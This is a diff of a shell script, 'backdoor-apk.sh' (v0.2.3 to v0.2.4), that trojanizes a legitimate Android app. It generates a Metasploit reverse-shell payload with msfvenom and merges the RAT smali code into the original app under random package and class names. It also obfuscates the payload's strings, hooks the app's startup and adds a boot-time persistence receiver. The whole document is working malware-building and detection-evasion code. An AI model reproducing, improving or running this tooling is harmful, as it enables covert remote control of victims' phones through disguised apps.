@@ -5,7 +5,7 @@
 # usage: ./backdoor-apk.sh original.apk
 
 # Dana James Traversie
-# Security Engineer
+# Security Architect | Hacker-in-Residence
 # Check Point Software Technologies, Ltd.
 
 # IMPORTANT: The following packages were required on Kali Linux
@@ -13,25 +13,29 @@
 #   required by other Linux distros as well.
 # apt-get install lib32z1 lib32ncurses5 lib32stdc++6
 
-VERSION="0.2.3"
+VERSION="0.2.4"
 
 PAYLOAD=""
 LHOST=""
 LPORT=""
 PERM_OPT=""
 
+ORIG_PACKAGE=""
+INJECT_PACKAGE=""
+SMALI_FILE_TO_HOOK=""
+
 MSFVENOM=msfvenom
-DEX2JAR=d2j-dex2jar
+BAKSMALI=baksmali
 UNZIP=unzip
 KEYTOOL=keytool
 JARSIGNER=jarsigner
 APKTOOL=apktool
-PROGUARD=third-party/proguard5.3.2/lib/proguard
 ASO=third-party/android-string-obfuscator/lib/aso
 DX=third-party/android-sdk-linux/build-tools/25.0.2/dx
 ZIPALIGN=third-party/android-sdk-linux/build-tools/25.0.2/zipalign
 # file paths and misc
 MY_PATH=`pwd`
+TMP_DIR=$MY_PATH/tmp
 ORIG_APK_FILE=$1
 RAT_APK_FILE=Rat.apk
 LOG_FILE=$MY_PATH/run.log
@@ -40,6 +44,25 @@ TIME_OF_RUN=`date`
 FUNC_RESULT=""
 
 # functions
+function gen_placeholder {
+  local result=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 32 | head -n 1)
+  FUNC_RESULT=$result
+  return 0
+}
+
+function gen_smali_package_dir {
+  local dir=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
+  FUNC_RESULT=$dir
+  return 0
+}
+
+function gen_smali_class_name {
+  local start=$(cat /dev/urandom | tr -dc 'A-Z' | fold -w 1 | head -n 1)
+  local end=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 4 | head -n 1)
+  FUNC_RESULT=$start$end
+  return 0
+}
+
 function find_smali_file {
   # $1 = smali_file_to_hook
   # $2 = android_class
@@ -66,39 +89,20 @@ function find_smali_file {
 }
 
 function hook_smali_file {
-  # $1 = payload_tld
-  # $2 = payload_primary_dir
-  # $3 = payload_sub_dir
-  # $4 = smali_file_to_hook
-  local stop_hooking=0
-  local smali_file=$4
-  while [ $stop_hooking -eq 0 ]; do
-    sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \\n\ \ \ \ invoke-static \{p0\}, L'"$1"'\/'"$2"'\/'"$3"'\/a;->a(Landroid\/content\/Context;)V' $smali_file >>$LOG_FILE 2>&1
-    grep -B 2 "$1/$2/$3/a" $smali_file >>$LOG_FILE 2>&1
-    if [ $? == 0 ]; then
-      echo "The smali file was hooked successfully" >>$LOG_FILE 2>&1
-      FUNC_RESULT=$smali_file
-      return 0
-    else
-      echo "Failed to hook smali file" >>$LOG_FILE 2>&1
-      local super_android_class=`grep ".super" $smali_file |sed 's/.super L//g' |sed 's/;//g'`
-      if [ -z $super_android_class ]; then
-        let stop_hooking=stop_hooking+1
-      else
-        echo "Trying to hook super class: $super_android_class" >>$LOG_FILE 2>&1
-        smali_file=$MY_PATH/original/smali/$super_android_class.smali
-        echo "New smali file to hook: $smali_file" >>$LOG_FILE 2>&1
-        find_smali_file $smali_file $super_android_class
-        if [ $? != 0 ]; then
-          echo "Failed to find new smali file" >>$LOG_FILE 2>&1
-          let stop_hooking=stop_hooking+1
-        else
-          echo "Found new smali file" >>$LOG_FILE 2>&1
-        fi
-      fi
-    fi
-  done
-  return 1
+  # $1 = new_ms_name
+  # $2 = smali_file_to_hook
+  local smali_file=$2
+  inject_line_num=$(grep -n "return-void" $smali_file |head -n 1|awk -F ":" '{ print $1 }')
+  sed -i ''"$inject_line_num"'i\ \ \ \ invoke-static \{\}, L'"$INJECT_PACKAGE"'\/'"$1"';->start()V\n' $smali_file >>$LOG_FILE 2>&1
+  grep -B 2 "$INJECT_PACKAGE/$1" $smali_file >>$LOG_FILE 2>&1
+  if [ $? == 0 ]; then
+    echo "The smali file was hooked successfully" >>$LOG_FILE 2>&1
+    FUNC_RESULT=$smali_file
+    return 0
+  else
+    echo "Failed to hook smali file" >>$LOG_FILE 2>&1
+    return 1
+  fi
 }
 
 function cleanup {
@@ -240,12 +244,11 @@ function init {
   print_ascii_art
   echo "[*] Running backdoor-apk.sh v$VERSION on $TIME_OF_RUN"
   consult_which $MSFVENOM
-  consult_which $DEX2JAR
+  consult_which $BAKSMALI
   consult_which $UNZIP
   consult_which $KEYTOOL
   consult_which $JARSIGNER
   consult_which $APKTOOL
-  consult_which $PROGUARD
   consult_which $ASO
   consult_which $DX
   consult_which $ZIPALIGN
@@ -254,6 +257,7 @@ function init {
   get_lhost
   get_lport
   get_perm_opt
+  mkdir -v $TMP_DIR >>$LOG_FILE 2>&1
 }
 
 # kick things off
@@ -271,15 +275,6 @@ exploit -j -z
 EOL
 echo "[+] Handle the payload via resource script: msfconsole -r backdoor-apk.rc"
 
-echo -n "[*] Generating RAT APK file..."
-$MSFVENOM -a dalvik --platform android -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f raw -o $RAT_APK_FILE >>$LOG_FILE 2>&1
-rc=$?
-echo "done."
-if [ $rc != 0 ] || [ ! -f $RAT_APK_FILE ]; then
-  echo "[!] Failed to generate RAT APK file"
-  exit 1
-fi
-
 echo -n "[*] Decompiling original APK file..."
 $APKTOOL d -f -o $MY_PATH/original $MY_PATH/$ORIG_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
@@ -290,27 +285,55 @@ if [ $rc != 0 ]; then
   exit $rc
 fi
 
-# build random hex placeholder value without openssl
-# used in various code that follows
-placeholder=''
-for i in `seq 1 4`; do
-  rand_num=`shuf -i 1-2147483647 -n 1`
-  hex=`printf '%x' $rand_num`
-  placeholder="$placeholder$hex"
-done
+echo -n "[*] Locating smali file to hook in original project..."
+total_package=`head -n 2 $MY_PATH/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'`
+android_name=`grep "<application" $MY_PATH/original/AndroidManifest.xml|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'`
+echo "Value of android_name: $android_name" >>$LOG_FILE 2>&1
+android_class=$android_name
+echo "Value of android_class: $android_class" >>$LOG_FILE 2>&1
+smali_file_to_hook=$MY_PATH/original/smali/$android_class.smali
+find_smali_file $smali_file_to_hook $android_class
+rc=$?
+if [ $rc != 0 ]; then
+  echo "done."
+  echo "[!] Failed to locate smali file to hook"
+  cleanup
+  exit $rc
+else
+  echo "done."
+  smali_file_to_hook=$FUNC_RESULT
+  echo "The smali file to hook: $smali_file_to_hook" >>$LOG_FILE 2>&1
+  ORIG_PACKAGE=$total_package
+  SMALI_FILE_TO_HOOK=$smali_file_to_hook
+fi
+echo "[+] Package where RAT smali files will be injected: $ORIG_PACKAGE"
+echo "[+] Smali file to hook RAT payload: $android_class.smali"
+
+echo -n "[*] Generating RAT APK file..."
+$MSFVENOM -a dalvik --platform android -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f raw -o $RAT_APK_FILE >>$LOG_FILE 2>&1
+rc=$?
+echo "done."
+if [ $rc != 0 ] || [ ! -f $RAT_APK_FILE ]; then
+  echo "[!] Failed to generate RAT APK file"
+  exit 1
+fi
+
+echo -n "[*] Decompiling RAT APK file..."
+$APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
+rc=$?
+echo "done."
+if [ $rc != 0 ]; then
+  echo "[!] Failed to decompile RAT APK file"
+  cleanup
+  exit $rc
+fi
+
+gen_placeholder
+placeholder=$FUNC_RESULT
 echo "placeholder value: $placeholder" >>$LOG_FILE 2>&1
 
 original_manifest_file=$MY_PATH/original/AndroidManifest.xml
 if [ "$PERM_OPT" == "RANDO" ]; then
-  echo -n "[*] Decompiling RAT APK file..."
-  $APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
-  rc=$?
-  echo "done."
-  if [ $rc != 0 ]; then
-    echo "[!] Failed to decompile RAT APK file"
-    cleanup
-    exit $rc
-  fi
   echo -n "[*] Merging permissions of original and payload projects..."
   tmp_perms_file=$MY_PATH/perms.tmp
   payload_manifest_file=$MY_PATH/payload/AndroidManifest.xml
@@ -327,7 +350,7 @@ if [ "$PERM_OPT" == "RANDO" ]; then
   mv $merged_manifest_file $original_manifest_file
   echo "done."
   # cleanup payload directory after merging app permissions
-  rm -rf $MY_PATH/payload >>$LOG_FILE 2>&1
+  #rm -rf $MY_PATH/payload >>$LOG_FILE 2>&1
 elif [ "$PERM_OPT" == "KEEPO" ]; then
   echo "[+] Keeping permissions of original project"
 else
@@ -336,92 +359,97 @@ else
   exit 1
 fi
 
-# use dex2jar, proguard, and dx
-# to shrink, optimize, and obfuscate original Rat.apk code
-echo -n "[*] Running proguard on RAT APK file..."
+# use dx and baksmali to inject Java classes
+echo -n "[*] Injecting helpful Java classes in RAT APK file..."
 mkdir -v -p $MY_PATH/bin/classes >>$LOG_FILE 2>&1
 mkdir -v -p $MY_PATH/libs >>$LOG_FILE 2>&1
-mv $MY_PATH/$RAT_APK_FILE $MY_PATH/bin/classes >>$LOG_FILE 2>&1
-$DEX2JAR $MY_PATH/bin/classes/$RAT_APK_FILE -o $MY_PATH/bin/classes/Rat-dex2jar.jar >>$LOG_FILE 2>&1
+$DX --dex --output="$MY_PATH/bin/classes/classes.dex" $MY_PATH/java/* >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc != 0 ]; then
   echo "done."
-  echo "[!] Failed to run dex2jar on RAT APK file"
+  echo "[!] Failed to run dx on Java class files"
   cleanup
   exit $rc
 fi
-# inject Java classes
-cp -R $MY_PATH/java/classes/* $MY_PATH/libs/ >>$LOG_FILE 2>&1
+$BAKSMALI d -o $MY_PATH/bin/classes/smali $MY_PATH/bin/classes/classes.dex >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc != 0 ]; then
   echo "done."
-  echo "[!] Failed to inject Java classes"
+  echo "[!] Failed to run baksmali on classes.dex created for Java class files"
   cleanup
   exit $rc
 fi
-cd $MY_PATH/bin/classes && jar xvf Rat-dex2jar.jar >>$LOG_FILE 2>&1
-cd $MY_PATH
-rm $MY_PATH/bin/classes/*.apk $MY_PATH/bin/classes/*.jar >>$LOG_FILE 2>&1
-$PROGUARD @android.pro >>$LOG_FILE 2>&1
+cp -v -r $MY_PATH/bin/classes/smali/* $MY_PATH/payload/smali >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc != 0 ]; then
   echo "done."
-  echo "[!] Failed to run proguard with specified configuration"
-  cleanup
-  exit $rc
-fi
-$DX --dex --output="$MY_PATH/$RAT_APK_FILE" $MY_PATH/bin/classes-processed.jar >>$LOG_FILE 2>&1
-rc=$?
-if [ $rc != 0 ]; then
-  echo "done."
-  echo "[!] Failed to run dx on proguard processed jar file"
+  echo "[!] Failed to inject smali files dervied from Java classes"
   cleanup
   exit $rc
 fi
 echo "done."
-
-echo -n "[*] Decompiling obfuscated RAT APK file..."
-$APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
-rc=$?
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to decompile RAT APK file"
-  cleanup
-  exit $rc
-fi
 
 # avoid having com/metasploit/stage path to smali files
-tldlist_max_line=`wc -l $MY_PATH/lists/tldlist.txt |awk '{ print $1 }'`
-tldlist_rand_line=`shuf -i 1-${tldlist_max_line} -n 1`
-namelist_max_line=`wc -l $MY_PATH/lists/namelist.txt |awk '{ print $1 }'`
-namelist_rand_line=`shuf -i 1-${namelist_max_line} -n 1`
-payload_tld=`sed "${tldlist_rand_line}q;d" $MY_PATH/lists/tldlist.txt`
-echo "payload_tld is: $payload_tld" >>$LOG_FILE 2>&1
-payload_primary_dir=`sed "${namelist_rand_line}q;d" $MY_PATH/lists/namelist.txt`
-echo "payload_primary_dir is: $payload_primary_dir" >>$LOG_FILE 2>&1
-namelist_rand_line=`shuf -i 1-${namelist_max_line} -n 1`
-payload_sub_dir=`sed "${namelist_rand_line}q;d" $MY_PATH/lists/namelist.txt`
-echo "payload_sub_dir is: $payload_sub_dir" >>$LOG_FILE 2>&1
-
-echo -n "[*] Creating new directories in original project for RAT smali files..."
-mkdir -v -p $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir >>$LOG_FILE 2>&1
+echo -n "[*] Creating new directory in original package for RAT smali files..."
+gen_smali_package_dir
+inject_package_dir=$FUNC_RESULT
+inject_package_path=$ORIG_PACKAGE/$inject_package_dir
+mkdir -v -p $MY_PATH/original/smali/$inject_package_path >>$LOG_FILE 2>&1
 rc=$?
 echo "done."
 if [ $rc != 0 ]; then
-  echo "[!] Failed to create new directories for RAT smali files"
+  echo "[!] Failed to create new directory for RAT smali files"
   cleanup
   exit $rc
+else
+  echo "[+] Inject package path: $inject_package_path"
+  INJECT_PACKAGE=$inject_package_path
 fi
 
+# create new smali class names
+gen_smali_class_name
+new_mbr_name=$FUNC_RESULT
+echo "[+] Generated new smali class name for MainBroadcastReceiver.smali: $new_mbr_name"
+gen_smali_class_name
+new_ms_name=$FUNC_RESULT
+echo "[+] Generated new smali class name for MainService.smali: $new_ms_name"
+gen_smali_class_name
+new_payload_name=$FUNC_RESULT
+echo "[+] Generated new smali class name for Payload.smali: $new_payload_name"
+gen_smali_class_name
+new_so_name=$FUNC_RESULT
+echo "[+] Generated new smali class name for StringObfuscator.smali: $new_so_name"
+gen_smali_package_dir
+new_so_obfuscate_method_name=$FUNC_RESULT
+echo "[+] Generated new smali method name for StringObfuscator.obfuscate method: $new_so_obfuscate_method_name"
+gen_smali_package_dir
+new_so_unobfuscate_method_name=$FUNC_RESULT
+echo "[+] Generated new smali method name for StringObfuscator.unobfuscate method: $new_so_unobfuscate_method_name"
+
 echo -n "[*] Copying RAT smali files to new directories in original project..."
-cp -v $MY_PATH/payload/smali/com/metasploit/stage/MainBroadcastReceiver.smali $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
+# handle MainBroadcastReceiver.smali
+mv -v $MY_PATH/payload/smali/com/metasploit/stage/MainBroadcastReceiver.smali $MY_PATH/original/smali/$INJECT_PACKAGE/$new_mbr_name.smali >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
-  cp -v $MY_PATH/payload/smali/com/metasploit/stage/MainService.smali $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/MainService.smali >>$LOG_FILE 2>&1
+  # handle MainService.smali
+  mv -v $MY_PATH/payload/smali/com/metasploit/stage/MainService.smali $MY_PATH/original/smali/$INJECT_PACKAGE/$new_ms_name.smali >>$LOG_FILE 2>&1
   rc=$?
 fi
 if [ $rc == 0 ]; then
-  cp -v $MY_PATH/payload/smali/net/dirtybox/util/*.smali $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/ >>$LOG_FILE 2>&1
+  # handle Payload.smali
+  mv -v $MY_PATH/payload/smali/com/metasploit/stage/Payload.smali $MY_PATH/original/smali/$INJECT_PACKAGE/$new_payload_name.smali >>$LOG_FILE 2>&1
+  rc=$?
+fi
+if [ $rc == 0 ]; then
+  cp -v $MY_PATH/payload/smali/com/metasploit/stage/*.smali $MY_PATH/original/smali/$INJECT_PACKAGE >>$LOG_FILE 2>&1
+  rc=$?
+fi
+if [ $rc == 0 ]; then
+  rm -v $MY_PATH/original/smali/$INJECT_PACKAGE/MainActivity.smali >>$LOG_FILE 2>&1
+  rc=$?
+fi
+if [ $rc == 0 ]; then
+  cp -v $MY_PATH/payload/smali/net/dirtybox/util/obfuscation/StringObfuscator.smali $MY_PATH/original/smali/$INJECT_PACKAGE/$new_so_name.smali >>$LOG_FILE 2>&1
   rc=$?
 fi
 echo "done."
@@ -432,15 +460,37 @@ if [ $rc != 0 ]; then
 fi
 
 echo -n "[*] Fixing RAT smali files..."
-sed -i 's/MainBroadcastReceiver/AppBoot/g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
+sed -i "s/MainBroadcastReceiver/$new_mbr_name/g" $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
-  sed -i 's|com\([./]\)metasploit\([./]\)stage|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{AppBoot.smali,MainService.smali} >>$LOG_FILE 2>&1
+  sed -i "s/MainService/$new_ms_name/g" $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali >>$LOG_FILE 2>&1
   rc=$?
 fi
 if [ $rc == 0 ]; then
-  sed -i 's|net\([./]\)dirtybox\([./]\)util|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali >>$LOG_FILE 2>&1
+  sed -i "s/Payload/$new_payload_name/g" $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali >>$LOG_FILE 2>&1
   rc=$?
+fi
+if [ $rc == 0 ]; then
+  sed -i "s/StringObfuscator/$new_so_name/g" $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali >>$LOG_FILE 2>&1
+  rc=$?
+fi
+if [ $rc == 0 ]; then
+  sed -i 's|com\([./]\)metasploit\([./]\)stage|'"$INJECT_PACKAGE"'|g' $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali >>$LOG_FILE 2>&1
+  rc=$?
+fi
+if [ $rc == 0 ]; then
+  sed -i 's|net\([./]\)dirtybox\([./]\)util\([./]\)obfuscation|'"$INJECT_PACKAGE"'|g' $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali >>$LOG_FILE 2>&1
+  rc=$?
+fi
+if [ $rc == 0 ]; then
+  #.method public static obfuscate(Ljava/lang/String;)Ljava/lang/String;
+  #.method public static unobfuscate(Ljava/lang/String;)Ljava/lang/String;
+  sed -i 's:method public static obfuscate:method public static '"$new_so_obfuscate_method_name"':g' $MY_PATH/original/smali/$INJECT_PACKAGE/$new_so_name.smali >>$LOG_FILE 2>&1
+  rc=$?
+  if [ $rc == 0 ]; then
+    sed -i 's:method public static unobfuscate:method public static '"$new_so_unobfuscate_method_name"':g' $MY_PATH/original/smali/$INJECT_PACKAGE/$new_so_name.smali >>$LOG_FILE 2>&1
+    rc=$?
+  fi
 fi
 echo "done."
 if [ $rc != 0 ]; then
@@ -449,16 +499,18 @@ if [ $rc != 0 ]; then
   exit $rc
 fi
 
+# TODO: Refactor and improve error handling and logging
 echo -n "[*] Obfuscating const-string values in RAT smali files..."
 cat >$MY_PATH/obfuscate.method <<EOL
+    const-string ###REG###, "###VALUE###"
 
-    invoke-static {###REG###}, L###CLASS###;->b(Ljava/lang/String;)Ljava/lang/String;
+    invoke-static {###REG###}, L###CLASS###;->###METHOD###(Ljava/lang/String;)Ljava/lang/String;
 
     move-result-object ###REG###
 EOL
-stringobfuscator_class=`ls $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |grep -v "AppBoot" |grep -v "MainService" |sort -r |head -n 1 |sed "s:$MY_PATH/original/smali/::g" |sed "s:.smali::g"`
+stringobfuscator_class=$INJECT_PACKAGE/$new_so_name
 echo "StringObfuscator class: $stringobfuscator_class" >>$LOG_FILE 2>&1
-so_class_suffix=`echo $stringobfuscator_class |awk -F "/" '{ printf "%s.smali", $4 }'`
+so_class_suffix="$new_so_name.smali"
 echo "StringObfuscator class suffix: $so_class_suffix" >>$LOG_FILE 2>&1
 so_default_key="7IPR19mk6hmUY+hdYUaCIw=="
 so_key=$so_default_key
@@ -483,18 +535,26 @@ else
   so_key=$so_default_key 
 fi
 echo "StringObfuscator key: $so_key" >>$LOG_FILE 2>&1
-sed -i 's/[[:space:]]*"$/"/g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali >>$LOG_FILE 2>&1
+sed -i 's/[[:space:]]*"$/"/g' $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
-  grep "const-string" --exclude="$so_class_suffix" $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |while read -r line; do
-    file=`echo $line |awk -F ": " '{ print $1 }'`
+  grep "const-string" -n --exclude="$so_class_suffix" $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali |while read -r line; do
+    gen_placeholder
+    placeholder=$FUNC_RESULT
+    echo "Placeholder: $placeholder" >>$LOG_FILE 2>&1
+    filewithlinenum=`echo $line |awk -F ": " '{ print $1 }'`
+    echo "File with line num: $filewithlinenum" >>$LOG_FILE 2>&1
+    file=`echo $filewithlinenum |awk -F ":" '{ print $1 }'`
     echo "File: $file" >>$LOG_FILE 2>&1
+    linenum=`echo $filewithlinenum |awk -F ":" '{ print $2 }'`
+    echo "Line num: $linenum" >>$LOG_FILE 2>&1
     target=`echo $line |awk -F ", " '{ print $2 }'`
     echo "Target: $target" >>$LOG_FILE 2>&1
     tmp=`echo $line |awk -F ": " '{ print $2 }'`
     reg=`echo $tmp |awk '{ print $2 }' |sed 's/,//'`
     echo "Reg: $reg" >>$LOG_FILE 2>&1
     stripped_target=`sed -e 's/^"//' -e 's/"$//' <<<"$target"`
+    echo "Stripped target: $stripped_target" >>$LOG_FILE 2>&1
     replacement=`$ASO e "$stripped_target" k "$so_key"`
     rc=$?
     if [ $rc != 0 ]; then
@@ -502,34 +562,50 @@ if [ $rc == 0 ]; then
       touch $MY_PATH/obfuscate.error
       break
     fi
-    replacement="\"$(echo $replacement)\""
     echo "Replacement: $replacement" >>$LOG_FILE 2>&1
-    sed -i 's%'"$target"'%'"$replacement"'%' $file >>$LOG_FILE 2>&1
-    rc=$?
-    if [ $rc != 0 ]; then
-      echo "Failed to replace target value" >>$LOG_FILE 2>&1
-      touch $MY_PATH/obfuscate.error
-      break
-    fi
-    sed -i '\|'"$replacement"'|r '"$MY_PATH"'/obfuscate.method' $file >>$LOG_FILE 2>&1
-    rc=$?
-    if [ $rc != 0 ]; then
-      echo "Failed to inject unobfuscate method call" >>$LOG_FILE 2>&1
-      touch $MY_PATH/obfuscate.error
-      break
-    fi
-    sed -i 's/###REG###/'"$reg"'/' $file >>$LOG_FILE 2>&1
+    echo "" >> $LOG_FILE 2>&1
+
+    sed -i -e ''"$linenum"'d' $file >>$LOG_FILE 2>&1
+    sed -i ''"$linenum"'i '"$placeholder"'' $file >>$LOG_FILE 2>&1
+
+    cp -v $MY_PATH/obfuscate.method $TMP_DIR/$placeholder.stub >>$LOG_FILE 2>&1
+
+    echo "$placeholder" >> $TMP_DIR/placeholders.txt
+
+    sed -i 's/###REG###/'"$reg"'/' $TMP_DIR/$placeholder.stub >>$LOG_FILE 2>&1
     rc=$?
     if [ $rc != 0 ]; then
       echo "Failed to inject register value" >>$LOG_FILE 2>&1
       touch $MY_PATH/obfuscate.error
       break
     fi
+    sed -i 's|###VALUE###|'"$replacement"'|' $TMP_DIR/$placeholder.stub >>$LOG_FILE 2>&1
+    rc=$?
+    if [ $rc != 0 ]; then
+      echo "Failed to inject replacement value" >>$LOG_FILE 2>&1
+      touch $MY_PATH/obfuscate.error
+      break
+    fi
   done
+  cd $TMP_DIR
+  cat placeholders.txt |while read placeholder; do
+    if [ -f $placeholder.stub ]; then
+      sed -i -e '/'"$placeholder"'/r '"$placeholder"'.stub' $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali >>$LOG_FILE 2>&1
+      sed -i -e '/'"$placeholder"'/d' $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali >>$LOG_FILE 2>&1
+    fi
+  done
+  cd $MY_PATH
+  rm -v $TMP_DIR/*.stub >>$LOG_FILE 2>&1
+  rm -v $TMP_DIR/placeholders.txt >>$LOG_FILE 2>&1
   if [ ! -f $MY_PATH/obfuscate.error ]; then
     class="$stringobfuscator_class"
-    sed -i 's|###CLASS###|'"$class"'|' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali
+    sed -i 's|###CLASS###|'"$class"'|' $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali
     rc=$?
+    if [ $rc == 0 ]; then
+      method="$new_so_unobfuscate_method_name"
+      sed -i 's|###METHOD###|'"$method"'|' $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali
+      rc=$?
+    fi
   else
     rm -v $MY_PATH/obfuscate.error >>$LOG_FILE 2>&1
     rc=1
@@ -542,47 +618,8 @@ if [ $rc != 0 ]; then
   exit $rc
 fi
 
-echo -n "[*] Locating smali file to hook in original project..."
-total_package=`head -n 2 $MY_PATH/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'`
-launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml |awk -F ":" '{ print $1 }'`
-echo "Found launcher line in manifest file: $launcher_line_num" >>$LOG_FILE 2>&1
-activity_line_count=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml |grep -c "<activity"`
-echo "Activity lines found above launcher line: $activity_line_count" >>$LOG_FILE 2>&1
-# should get a value here if launcher line is within an activity-alias element
-android_target_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:targetActivity="[^\"]+"'|sed 's/\"//g'|sed 's/android:targetActivity=//g'|sed 's/\./\//g'`
-echo "Value of android_target_activity: $android_target_activity" >>$LOG_FILE 2>&1
-android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'`
-echo "Value of android_name: $android_name" >>$LOG_FILE 2>&1
-if [ -z $android_target_activity ]; then
-  echo "The launcher line appears to be within an activity element" >>$LOG_FILE 2>&1
-  tmp=$android_name
-else
-  echo "The launcher line appears to be within an activity-alias element" >>$LOG_FILE 2>&1
-  tmp=$android_target_activity
-fi
-echo "Value of tmp: $tmp" >>$LOG_FILE 2>&1
-# add package from manifest if needed
-if [[ $tmp == /* ]]; then
-  tmp=$total_package$tmp
-fi
-android_class=$tmp
-echo "Value of android_class: $android_class" >>$LOG_FILE 2>&1
-smali_file_to_hook=$MY_PATH/original/smali/$android_class.smali
-find_smali_file $smali_file_to_hook $android_class
-rc=$?
-if [ $rc != 0 ]; then
-  echo "done."
-  echo "[!] Failed to locate smali file to hook"
-  cleanup
-  exit $rc
-else
-  echo "done."
-  smali_file_to_hook=$FUNC_RESULT
-  echo "The smali file to hook: $smali_file_to_hook" >>$LOG_FILE 2>&1
-fi
-
 echo -n "[*] Adding hook in original smali file..."
-hook_smali_file $payload_tld $payload_primary_dir $payload_sub_dir $smali_file_to_hook
+hook_smali_file $new_ms_name $smali_file_to_hook
 rc=$?
 echo "done."
 if [ $rc != 0 ]; then
@@ -591,20 +628,20 @@ if [ $rc != 0 ]; then
   exit $rc
 fi
 
+dotted_inject_package=$(echo "$INJECT_PACKAGE" |sed -r 's:/:.:g')
 cat >$MY_PATH/persistence.hook <<EOL
-        <receiver android:name="${payload_tld}.${payload_primary_dir}.${payload_sub_dir}.AppBoot">
+        <receiver android:name="${dotted_inject_package}.${new_mbr_name}">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
             </intent-filter>
         </receiver>
-        <service android:exported="true" android:name="${payload_tld}.${payload_primary_dir}.${payload_sub_dir}.MainService"/>
+        <service android:exported="true" android:name="${dotted_inject_package}.${new_ms_name}"/>
 EOL
-
 grep "android.permission.RECEIVE_BOOT_COMPLETED" $original_manifest_file >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
   echo -n "[*] Adding persistence hook in original project..."
-  sed -i '0,/<\/activity>/s//<\/activity>\n'"$placeholder"'/' $original_manifest_file >>$LOG_FILE 2>&1
+  sed -i '0,/<\/application>/s//'"$placeholder"'\n    <\/application>/' $original_manifest_file >>$LOG_FILE 2>&1
   rc=$?
   if [ $rc == 0 ]; then
     sed -i '/'"$placeholder"'/r '"$MY_PATH"'/persistence.hook' $original_manifest_file >>$LOG_FILE 2>&1
@@ -622,8 +659,6 @@ if [ $rc == 0 ]; then
   fi
 else
   echo "[+] Unable to add persistence hook due to missing permission"
-  ##### TODO #####
-  # Delete AppBoot.smali and MainService.smali before recompilation?
 fi
 
 echo -n "[*] Recompiling original project with backdoor..."
